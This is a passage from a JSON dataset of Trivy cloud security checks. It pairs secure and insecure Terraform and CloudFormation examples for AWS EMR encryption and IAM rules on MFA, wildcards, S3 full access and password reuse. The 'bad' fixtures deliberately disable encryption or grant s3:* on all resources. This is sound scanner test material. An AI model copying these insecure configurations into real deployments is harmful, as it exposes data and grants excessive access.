        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/emr_security_configuration\n  good:\n    - |-\n      resource \"aws_emr_security_configuration\" \"good_example\" {\n        name = \"emrsc_other\"\n\n        configuration = <<EOF\n        {\n          \"EncryptionConfiguration\": {\n            \"AtRestEncryptionConfiguration\": {\n              \"S3EncryptionConfiguration\": {\n                \"EncryptionMode\": \"SSE-S3\"\n              },\n              \"LocalDiskEncryptionConfiguration\": {\n                \"EncryptionKeyProviderType\": \"AwsKms\",\n                \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n              }\n            },\n            \"EnableInTransitEncryption\": true,\n            \"EnableAtRestEncryption\": true\n          }\n        }\n        EOF\n      }\n  bad:\n    - |-\n      resource \"aws_emr_security_configuration\" \"bad_example\" {\n        name = \"emrsc_other\"\n\n        configuration = <<EOF\n        {\n          \"EncryptionConfiguration\": {\n            \"AtRestEncryptionConfiguration\": {\n              \"S3EncryptionConfiguration\": {\n                \"EncryptionMode\": \"SSE-S3\"\n              },\n              \"LocalDiskEncryptionConfiguration\": {\n                \"EncryptionKeyProviderType\": \"AwsKms\",\n                \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n              }\n            },\n            \"EnableInTransitEncryption\": false,\n            \"EnableAtRestEncryption\": false\n          }\n        }\n        EOF\n      }\n",
        "file_name": "enable_at_rest_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/emr/enable_at_rest_encryption.yaml",
        "local_path": "aws/emr/enable_at_rest_encryption.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/emr_security_configuration"
            ],
            "good": [
              "resource \"aws_emr_security_configuration\" \"good_example\" {\n  name = \"emrsc_other\"\n\n  configuration = <<EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"AwsKms\",\n          \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n        }\n      },\n      \"EnableInTransitEncryption\": true,\n      \"EnableAtRestEncryption\": true\n    }\n  }\n  EOF\n}"
            ],
            "bad": [
              "resource \"aws_emr_security_configuration\" \"bad_example\" {\n  name = \"emrsc_other\"\n\n  configuration = <<EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"AwsKms\",\n          \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n        }\n      },\n      \"EnableInTransitEncryption\": false,\n      \"EnableAtRestEncryption\": false\n    }\n  }\n  EOF\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EMR-ENABLE_IN_TRANSIT_ENCRYPTION",
        "title": "Enable In Transit Encryption",
        "provider": "aws",
        "service": "emr",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/emr_security_configuration\n  good:\n    - |-\n      resource \"aws_emr_security_configuration\" \"good_example\" {\n        name = \"emrsc_other\"\n\n        configuration = <<EOF\n        {\n          \"EncryptionConfiguration\": {\n            \"AtRestEncryptionConfiguration\": {\n              \"S3EncryptionConfiguration\": {\n                \"EncryptionMode\": \"SSE-S3\"\n              },\n              \"LocalDiskEncryptionConfiguration\": {\n                \"EncryptionKeyProviderType\": \"AwsKms\",\n                \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n              }\n            },\n            \"EnableInTransitEncryption\": true,\n            \"EnableAtRestEncryption\": true\n          }\n        }\n        EOF\n      }\n  bad:\n    - |-\n      resource \"aws_emr_security_configuration\" \"bad_example\" {\n        name = \"emrsc_other\"\n\n        configuration = <<EOF\n        {\n          \"EncryptionConfiguration\": {\n            \"AtRestEncryptionConfiguration\": {\n              \"S3EncryptionConfiguration\": {\n                \"EncryptionMode\": \"SSE-S3\"\n              },\n              \"LocalDiskEncryptionConfiguration\": {\n                \"EncryptionKeyProviderType\": \"AwsKms\",\n                \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n              }\n            },\n            \"EnableInTransitEncryption\": false,\n            \"EnableAtRestEncryption\": false\n          }\n        }\n        EOF\n      }\n",
        "file_name": "enable_in_transit_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/emr/enable_in_transit_encryption.yaml",
        "local_path": "aws/emr/enable_in_transit_encryption.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/emr_security_configuration"
            ],
            "good": [
              "resource \"aws_emr_security_configuration\" \"good_example\" {\n  name = \"emrsc_other\"\n\n  configuration = <<EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"AwsKms\",\n          \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n        }\n      },\n      \"EnableInTransitEncryption\": true,\n      \"EnableAtRestEncryption\": true\n    }\n  }\n  EOF\n}"
            ],
            "bad": [
              "resource \"aws_emr_security_configuration\" \"bad_example\" {\n  name = \"emrsc_other\"\n\n  configuration = <<EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"AwsKms\",\n          \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n        }\n      },\n      \"EnableInTransitEncryption\": false,\n      \"EnableAtRestEncryption\": false\n    }\n  }\n  EOF\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EMR-ENABLE_LOCAL_DISK_ENCRYPTION",
        "title": "Enable Local Disk Encryption",
        "provider": "aws",
        "service": "emr",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/emr_security_configuration\n  good:\n    - |-\n      resource \"aws_emr_security_configuration\" \"good_example\" {\n        name = \"emrsc_other\"\n\n        configuration = <<EOF\n        {\n          \"EncryptionConfiguration\": {\n            \"AtRestEncryptionConfiguration\": {\n              \"S3EncryptionConfiguration\": {\n                \"EncryptionMode\": \"SSE-S3\"\n              },\n              \"LocalDiskEncryptionConfiguration\": {\n                \"EncryptionKeyProviderType\": \"AwsKms\",\n                \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n              }\n            },\n            \"EnableInTransitEncryption\": true,\n            \"EnableAtRestEncryption\": true\n          }\n        }\n        EOF\n      }\n  bad:\n    - |-\n      resource \"aws_emr_security_configuration\" \"bad_example\" {\n        name = \"emrsc_other\"\n\n        configuration = <<EOF\n        {\n          \"EncryptionConfiguration\": {\n            \"AtRestEncryptionConfiguration\": {\n              \"S3EncryptionConfiguration\": {\n                \"EncryptionMode\": \"SSE-S3\"\n              },\n              \"LocalDiskEncryptionConfiguration\": {\n                \"EncryptionKeyProviderType\": \"\",\n                \"AwsKmsKey\": \"\"\n              }\n            },\n            \"EnableInTransitEncryption\": false,\n            \"EnableAtRestEncryption\": false\n          }\n        }\n        EOF\n      }\n",
        "file_name": "enable_local_disk_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/emr/enable_local_disk_encryption.yaml",
        "local_path": "aws/emr/enable_local_disk_encryption.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/emr_security_configuration"
            ],
            "good": [
              "resource \"aws_emr_security_configuration\" \"good_example\" {\n  name = \"emrsc_other\"\n\n  configuration = <<EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"AwsKms\",\n          \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n        }\n      },\n      \"EnableInTransitEncryption\": true,\n      \"EnableAtRestEncryption\": true\n    }\n  }\n  EOF\n}"
            ],
            "bad": [
              "resource \"aws_emr_security_configuration\" \"bad_example\" {\n  name = \"emrsc_other\"\n\n  configuration = <<EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"\",\n          \"AwsKmsKey\": \"\"\n        }\n      },\n      \"EnableInTransitEncryption\": false,\n      \"EnableAtRestEncryption\": false\n    }\n  }\n  EOF\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-ENFORCE_GROUP_MFA",
        "title": "Enforce Group Mfa",
        "provider": "aws",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/modules/terraform-module/enforce-mfa/aws/latest\n    - https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details\n  good:\n    - |-\n      resource \"aws_iam_group\" \"support\" {\n        name = \"support\"\n      }\n      resource \"aws_iam_group_policy\" \"mfa\" {\n\n        group  = aws_iam_group.support.name\n        policy = <<EOF\n      {\n        \"Version\": \"2012-10-17\",\n        \"Statement\": [\n          {\n            \"Sid\": \"\",\n            \"Effect\": \"Allow\",\n            \"Action\": \"ec2:*\",\n            \"Resource\": \"*\",\n            \"Condition\": {\n                \"Bool\": {\n                    \"aws:MultiFactorAuthPresent\": [\"true\"]\n                }\n            }\n          }\n        ]\n      }\n      EOF\n      }\n    - |-\n      resource \"aws_iam_group\" \"support\" {\n        name = \"support\"\n      }\n      resource \"aws_iam_policy\" \"mfa\" {\n\n        name   = \"something\"\n        policy = <<EOF\n      {\n        \"Version\": \"2012-10-17\",\n        \"Statement\": [\n          {\n            \"Sid\": \"\",\n            \"Effect\": \"Allow\",\n            \"Action\": \"ec2:*\",\n            \"Resource\": \"*\",\n            \"Condition\": {\n                \"Bool\": {\n                    \"aws:MultiFactorAuthPresent\": [\"true\"]\n                }\n            }\n          }\n        ]\n      }\n      EOF\n      }\n      resource \"aws_iam_group_policy_attachment\" \"attach\" {\n        group      = aws_iam_group.support.name\n        policy_arn = aws_iam_policy.mfa.id\n      }\n    - |-\n      resource \"aws_iam_group\" \"support\" {\n        name = \"support\"\n      }\n      resource \"aws_iam_group_policy\" \"mfa\" {\n        group  = aws_iam_group.support.name\n        policy = data.aws_iam_policy_document.combined.json\n      }\n      data \"aws_iam_policy_document\" \"policy_override\" {\n        statement {\n          sid       = \"main\"\n          effect    = \"Allow\"\n          actions   = [\"s3:*\"]\n          resources = [\"*\"]\n          condition {\n            test     = \"Bool\"\n            variable = \"aws:MultiFactorAuthPresent\"\n            values   = [\"true\"]\n          }\n        }\n      }\n      data \"aws_iam_policy_document\" \"policy_source\" {\n        statement {\n          sid       = \"main\"\n          effect    = \"Allow\"\n          actions   = [\"iam:*\"]\n          resources = [\"*\"]\n        }\n      }\n      data \"aws_iam_policy_document\" \"policy_misc\" {\n        statement {\n          sid       = \"misc\"\n          effect    = \"Deny\"\n          actions   = [\"logs:*\"]\n          resources = [\"*\"]\n        }\n      }\n      data \"aws_iam_policy_document\" \"combined\" {\n        source_json = <<EOF\n          {\n              \"Id\": \"base\"\n          }\n      EOF\n        source_policy_documents = [\n          data.aws_iam_policy_document.policy_source.json\n        ]\n        override_policy_documents = [\n          data.aws_iam_policy_document.policy_override.json,\n          data.aws_iam_policy_document.policy_misc.json\n        ]\n        statement {\n          sid       = \"whatever\"\n          effect    = \"Deny\"\n          actions   = [\"*\"]\n          resources = [\"*\"]\n        }\n      }\n  bad:\n    - |-\n      data \"aws_caller_identity\" \"current\" {}\n      resource \"aws_iam_group\" \"developers\" {\n        name = \"developers\"\n      }\n",
        "file_name": "enforce_group_mfa.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/enforce_group_mfa.yaml",
        "local_path": "aws/iam/enforce_group_mfa.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/modules/terraform-module/enforce-mfa/aws/latest",
              "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details"
            ],
            "good": [
              "resource \"aws_iam_group\" \"support\" {\n  name = \"support\"\n}\nresource \"aws_iam_group_policy\" \"mfa\" {\n\n  group  = aws_iam_group.support.name\n  policy = <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"\",\n      \"Effect\": \"Allow\",\n      \"Action\": \"ec2:*\",\n      \"Resource\": \"*\",\n      \"Condition\": {\n          \"Bool\": {\n              \"aws:MultiFactorAuthPresent\": [\"true\"]\n          }\n      }\n    }\n  ]\n}\nEOF\n}",
              "resource \"aws_iam_group\" \"support\" {\n  name = \"support\"\n}\nresource \"aws_iam_policy\" \"mfa\" {\n\n  name   = \"something\"\n  policy = <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"\",\n      \"Effect\": \"Allow\",\n      \"Action\": \"ec2:*\",\n      \"Resource\": \"*\",\n      \"Condition\": {\n          \"Bool\": {\n              \"aws:MultiFactorAuthPresent\": [\"true\"]\n          }\n      }\n    }\n  ]\n}\nEOF\n}\nresource \"aws_iam_group_policy_attachment\" \"attach\" {\n  group      = aws_iam_group.support.name\n  policy_arn = aws_iam_policy.mfa.id\n}",
              "resource \"aws_iam_group\" \"support\" {\n  name = \"support\"\n}\nresource \"aws_iam_group_policy\" \"mfa\" {\n  group  = aws_iam_group.support.name\n  policy = data.aws_iam_policy_document.combined.json\n}\ndata \"aws_iam_policy_document\" \"policy_override\" {\n  statement {\n    sid       = \"main\"\n    effect    = \"Allow\"\n    actions   = [\"s3:*\"]\n    resources = [\"*\"]\n    condition {\n      test     = \"Bool\"\n      variable = \"aws:MultiFactorAuthPresent\"\n      values   = [\"true\"]\n    }\n  }\n}\ndata \"aws_iam_policy_document\" \"policy_source\" {\n  statement {\n    sid       = \"main\"\n    effect    = \"Allow\"\n    actions   = [\"iam:*\"]\n    resources = [\"*\"]\n  }\n}\ndata \"aws_iam_policy_document\" \"policy_misc\" {\n  statement {\n    sid       = \"misc\"\n    effect    = \"Deny\"\n    actions   = [\"logs:*\"]\n    resources = [\"*\"]\n  }\n}\ndata \"aws_iam_policy_document\" \"combined\" {\n  source_json = <<EOF\n    {\n        \"Id\": \"base\"\n    }\nEOF\n  source_policy_documents = [\n    data.aws_iam_policy_document.policy_source.json\n  ]\n  override_policy_documents = [\n    data.aws_iam_policy_document.policy_override.json,\n    data.aws_iam_policy_document.policy_misc.json\n  ]\n  statement {\n    sid       = \"whatever\"\n    effect    = \"Deny\"\n    actions   = [\"*\"]\n    resources = [\"*\"]\n  }\n}"
            ],
            "bad": [
              "data \"aws_caller_identity\" \"current\" {}\nresource \"aws_iam_group\" \"developers\" {\n  name = \"developers\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-LIMIT_S3_FULL_ACCESS",
        "title": "Limit S3 Full Access",
        "provider": "aws",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Resources:\n        GoodPolicy:\n          Type: AWS::IAM::Policy\n          Properties:\n            PolicyName: good_policy\n            PolicyDocument:\n              Version: \"2012-10-17\"\n              Statement:\n                - Effect: Allow\n                  Action:\n                    - s3:GetObject\n                    - s3:PutObject\n                  Resource: arn:aws:s3:::examplebucket/*\n            Roles:\n              - !Ref GoodRole\n\n        GoodRole:\n          Type: AWS::IAM::Role\n          Properties:\n            RoleName: good_role\n            AssumeRolePolicyDocument:\n              Version: \"2012-10-17\"\n              Statement:\n                - Effect: Allow\n                  Principal:\n                    Service: ec2.amazonaws.com\n                  Action: sts:AssumeRole\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Resources:\n        BadPolicy:\n          Type: AWS::IAM::Policy\n          Properties:\n            PolicyName: bad_policy\n            PolicyDocument:\n              Version: \"2012-10-17\"\n              Statement:\n                - Effect: Allow\n                  Action: s3:*\n                  Resource: '*'\n            Roles:\n              - !Ref BadRole\n\n        BadRole:\n          Type: AWS::IAM::Role\n          Properties:\n            RoleName: bad_role\n            AssumeRolePolicyDocument:\n              Version: \"2012-10-17\"\n              Statement:\n                - Effect: Allow\n                  Principal:\n                    Service: ec2.amazonaws.com\n                  Action: sts:AssumeRole\nterraform:\n  good:\n    - |-\n      resource \"aws_iam_policy\" \"good_policy\" {\n        name = \"good_policy\"\n        policy = jsonencode({\n          Version = \"2012-10-17\"\n          Statement = [\n            {\n              Effect = \"Allow\"\n              Action = [\n                \"s3:GetObject\",\n                \"s3:PutObject\"\n              ]\n              Resource = \"arn:aws:s3:::examplebucket/*\"\n            }\n          ]\n        })\n      }\n\n      resource \"aws_iam_role\" \"good_role\" {\n        name = \"good_role\"\n        assume_role_policy = jsonencode({\n          Version = \"2012-10-17\"\n          Statement = [\n            {\n              Effect = \"Allow\"\n              Principal = {\n                Service = \"ec2.amazonaws.com\"\n              }\n              Action = \"sts:AssumeRole\"\n            }\n          ]\n        })\n      }\n\n      resource \"aws_iam_role_policy_attachment\" \"good_role_policy_attachment\" {\n        role       = aws_iam_role.good_role.name\n        policy_arn = aws_iam_policy.good_policy.arn\n      }\n  bad:\n    - |-\n      resource \"aws_iam_policy\" \"bad_policy\" {\n        name = \"bad_policy\"\n        policy = jsonencode({\n          Version = \"2012-10-17\"\n          Statement = [\n            {\n              Effect   = \"Allow\"\n              Action   = \"s3:*\"\n              Resource = \"*\"\n            }\n          ]\n        })\n      }\n\n      resource \"aws_iam_role_policy_attachment\" \"test\" {\n        role       = aws_iam_role.test.name\n        policy_arn = \"arn:aws:iam::aws:policy/AmazonS3FullAccess\"\n      }\n\n      resource \"aws_iam_role\" \"bad_role\" {\n        name = \"bad_role\"\n        assume_role_policy = jsonencode({\n          Version = \"2012-10-17\"\n          Statement = [\n            {\n              Effect = \"Allow\"\n              Principal = {\n                Service = \"ec2.amazonaws.com\"\n              }\n              Action = \"sts:AssumeRole\"\n            }\n          ]\n        })\n      }\n\n      resource \"aws_iam_role_policy_attachment\" \"bad_role_policy_attachment\" {\n        role       = aws_iam_role.bad_role.name\n        policy_arn = aws_iam_policy.bad_policy.arn\n      }\n",
        "file_name": "limit_s3_full_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/limit_s3_full_access.yaml",
        "local_path": "aws/iam/limit_s3_full_access.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nResources:\n  GoodPolicy:\n    Type: AWS::IAM::Policy\n    Properties:\n      PolicyName: good_policy\n      PolicyDocument:\n        Version: \"2012-10-17\"\n        Statement:\n          - Effect: Allow\n            Action:\n              - s3:GetObject\n              - s3:PutObject\n            Resource: arn:aws:s3:::examplebucket/*\n      Roles:\n        - !Ref GoodRole\n\n  GoodRole:\n    Type: AWS::IAM::Role\n    Properties:\n      RoleName: good_role\n      AssumeRolePolicyDocument:\n        Version: \"2012-10-17\"\n        Statement:\n          - Effect: Allow\n            Principal:\n              Service: ec2.amazonaws.com\n            Action: sts:AssumeRole"
            ],
            "bad": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nResources:\n  BadPolicy:\n    Type: AWS::IAM::Policy\n    Properties:\n      PolicyName: bad_policy\n      PolicyDocument:\n        Version: \"2012-10-17\"\n        Statement:\n          - Effect: Allow\n            Action: s3:*\n            Resource: '*'\n      Roles:\n        - !Ref BadRole\n\n  BadRole:\n    Type: AWS::IAM::Role\n    Properties:\n      RoleName: bad_role\n      AssumeRolePolicyDocument:\n        Version: \"2012-10-17\"\n        Statement:\n          - Effect: Allow\n            Principal:\n              Service: ec2.amazonaws.com\n            Action: sts:AssumeRole"
            ]
          },
          "terraform": {
            "good": [
              "resource \"aws_iam_policy\" \"good_policy\" {\n  name = \"good_policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Action = [\n          \"s3:GetObject\",\n          \"s3:PutObject\"\n        ]\n        Resource = \"arn:aws:s3:::examplebucket/*\"\n      }\n    ]\n  })\n}\n\nresource \"aws_iam_role\" \"good_role\" {\n  name = \"good_role\"\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Principal = {\n          Service = \"ec2.amazonaws.com\"\n        }\n        Action = \"sts:AssumeRole\"\n      }\n    ]\n  })\n}\n\nresource \"aws_iam_role_policy_attachment\" \"good_role_policy_attachment\" {\n  role       = aws_iam_role.good_role.name\n  policy_arn = aws_iam_policy.good_policy.arn\n}"
            ],
            "bad": [
              "resource \"aws_iam_policy\" \"bad_policy\" {\n  name = \"bad_policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect   = \"Allow\"\n        Action   = \"s3:*\"\n        Resource = \"*\"\n      }\n    ]\n  })\n}\n\nresource \"aws_iam_role_policy_attachment\" \"test\" {\n  role       = aws_iam_role.test.name\n  policy_arn = \"arn:aws:iam::aws:policy/AmazonS3FullAccess\"\n}\n\nresource \"aws_iam_role\" \"bad_role\" {\n  name = \"bad_role\"\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Principal = {\n          Service = \"ec2.amazonaws.com\"\n        }\n        Action = \"sts:AssumeRole\"\n      }\n    ]\n  })\n}\n\nresource \"aws_iam_role_policy_attachment\" \"bad_role_policy_attachment\" {\n  role       = aws_iam_role.bad_role.name\n  policy_arn = aws_iam_policy.bad_policy.arn\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-NO_PASSWORD_REUSE",
        "title": "No Password Reuse",
        "provider": "aws",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy\n  good:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"good_example\" {\n        # ...\n        password_reuse_prevention = 5\n        # ...\n      }\n  bad:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"bad_example\" {\n        # ...\n        password_reuse_prevention = 1\n        # ...\n      }\n",
        "file_name": "no_password_reuse.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/no_password_reuse.yaml",
        "local_path": "aws/iam/no_password_reuse.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy"
            ],
            "good": [
              "resource \"aws_iam_account_password_policy\" \"good_example\" {\n  # ...\n  password_reuse_prevention = 5\n  # ...\n}"
            ],
            "bad": [
              "resource \"aws_iam_account_password_policy\" \"bad_example\" {\n  # ...\n  password_reuse_prevention = 1\n  # ...\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-NO_POLICY_WILDCARDS",
        "title": "No Policy Wildcards",
        "provider": "aws",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodPolicy:\n          Type: AWS::IAM::Policy\n          Properties:\n            PolicyName: CFNUsers\n            PolicyDocument:\n              Version: \"2012-10-17\"\n              Statement:\n                - Effect: Allow\n                  Action:\n                    - s3:ListBuckets\n                  Resource: specific-bucket\n  bad:\n    - |-\n      Resources:\n        BadPolicy:\n          Type: AWS::IAM::Policy\n          Properties:\n            PolicyName: CFNUsers\n            PolicyDocument:\n\n        Version: \"2012-10-17\"\n\n        Statement:\n          - Effect: Allow\n            Action:\n              - cloudformation:Describe*\n              - cloudformation:List*\n              - cloudformation:Get*\n            Resource: '*'\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/data-sources/iam_policy_document\n  good:\n    - |-\n      resource \"aws_iam_role_policy\" \"test_policy\" {\n        name = \"test_policy\"\n        role = aws_iam_role.test_role.id\n\n        policy = data.aws_iam_policy_document.s3_policy.json\n      }\n\n      resource \"aws_iam_role\" \"test_role\" {\n        name = \"test_role\"\n        assume_role_policy = jsonencode({\n          Version = \"2012-10-17\"\n          Statement = [\n            {\n              Action = \"sts:AssumeRole\"\n              Effect = \"Allow\"\n              Sid    = \"\"\n              Principal = {\n                Service = \"s3.amazonaws.com\"\n              }\n            },\n          ]\n        })\n      }\n\n      data \"aws_iam_policy_document\" \"s3_policy\" {\n        statement {\n          principals {\n            type        = \"AWS\"\n            identifiers = [\"arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\"]\n          }\n          actions   = [\"s3:GetObject\"]\n          resources = [aws_s3_bucket.example.arn]\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_iam_role_policy\" \"test_policy\" {\n        name = \"test_policy\"\n        role = aws_iam_role.test_role.id\n\n        policy = data.aws_iam_policy_document.s3_policy.json\n      }\n\n      resource \"aws_iam_role\" \"test_role\" {\n        name = \"test_role\"\n        assume_role_policy = jsonencode({\n          Version = \"2012-10-17\"\n          Statement = [\n            {\n              Action = \"sts:AssumeRole\"\n              Effect = \"Allow\"\n              Sid    = \"\"\n              Principal = {\n                Service = \"s3.amazonaws.com\"\n              }\n            },\n          ]\n        })\n      }\n\n      data \"aws_iam_policy_document\" \"s3_policy\" {\n        statement {\n          principals {\n            type        = \"AWS\"\n            identifiers = [\"arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\"]\n          }\n          actions   = [\"s3:*\"]\n          resources = [\"*\"]\n        }\n      }\n",
        "file_name": "no_policy_wildcards.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/no_policy_wildcards.yaml",
        "local_path": "aws/iam/no_policy_wildcards.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodPolicy:\n    Type: AWS::IAM::Policy\n    Properties:\n      PolicyName: CFNUsers\n      PolicyDocument:\n        Version: \"2012-10-17\"\n        Statement:\n          - Effect: Allow\n            Action:\n              - s3:ListBuckets\n            Resource: specific-bucket"
            ],
            "bad": [
              "Resources:\n  BadPolicy:\n    Type: AWS::IAM::Policy\n    Properties:\n      PolicyName: CFNUsers\n      PolicyDocument:\n\n  Version: \"2012-10-17\"\n\n  Statement:\n    - Effect: Allow\n      Action:\n        - cloudformation:Describe*\n        - cloudformation:List*\n        - cloudformation:Get*\n      Resource: '*'"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/data-sources/iam_policy_document"
            ],
            "good": [
              "resource \"aws_iam_role_policy\" \"test_policy\" {\n  name = \"test_policy\"\n  role = aws_iam_role.test_role.id\n\n  policy = data.aws_iam_policy_document.s3_policy.json\n}\n\nresource \"aws_iam_role\" \"test_role\" {\n  name = \"test_role\"\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = \"sts:AssumeRole\"\n        Effect = \"Allow\"\n        Sid    = \"\"\n        Principal = {\n          Service = \"s3.amazonaws.com\"\n        }\n      },\n    ]\n  })\n}\n\ndata \"aws_iam_policy_document\" \"s3_policy\" {\n  statement {\n    principals {\n      type        = \"AWS\"\n      identifiers = [\"arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\"]\n    }\n    actions   = [\"s3:GetObject\"]\n    resources = [aws_s3_bucket.example.arn]\n  }\n}"
            ],
            "bad": [
              "resource \"aws_iam_role_policy\" \"test_policy\" {\n  name = \"test_policy\"\n  role = aws_iam_role.test_role.id\n\n  policy = data.aws_iam_policy_document.s3_policy.json\n}\n\nresource \"aws_iam_role\" \"test_role\" {\n  name = \"test_role\"\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = \"sts:AssumeRole\"\n        Effect = \"Allow\"\n        Sid    = \"\"\n        Principal = {\n          Service = \"s3.amazonaws.com\"\n        }\n      },\n    ]\n  })\n}\n\ndata \"aws_iam_policy_document\" \"s3_policy\" {\n  statement {\n    principals {\n      type        = \"AWS\"\n      identifiers = [\"arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\"]\n    }\n    actions   = [\"s3:*\"]\n    resources = [\"*\"]\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-NO_ROOT_ACCESS_KEYS",
        "title": "No Root Access Keys",
        "provider": "aws",
        "service": "iam",
        "language": "terraform",
